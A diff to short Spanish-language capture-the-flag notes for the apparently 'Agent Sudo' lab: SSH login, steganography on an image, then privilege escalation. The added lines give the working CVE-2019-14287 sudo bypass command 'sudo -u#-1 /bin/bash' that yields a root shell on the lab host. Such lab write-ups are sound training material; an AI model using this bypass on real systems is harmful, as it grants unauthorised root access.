@@ -41,3 +41,7 @@ Agent R
 - habria q ver la otra foto dado a que es un .png
 - ssh james@10.128.166.133 y contraseña listo estamos dentro
 - Pillamos flag y nos enviamos con scp una imagen le aplicamos stegseek y vemos que el nombre de l aimagen es Roswell alien autopsy
+- sudo -l y vemos que tenemos /bin/bash como sudo jaaja -> james@agent-sudo:~$ sudo /bin/bash Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo.james@agent-sudo:~$ sudo -u chris /bin/bash
+- cambiamos al otro user que conocemos dado a que no deja esta capado james (bloqqueado) y tampoco deja ejecutar sudo con ese user. 
+- Busco por CVE -> james@agent-sudo:~$ sudo --version Sudo version 1.8.21p2 -> ENCUENTRO CVE-2019-14287 y es simplemente ejcutar -> sudo -u#-1 /bin/bash
+- DIRectorio root y listo pillamos flag
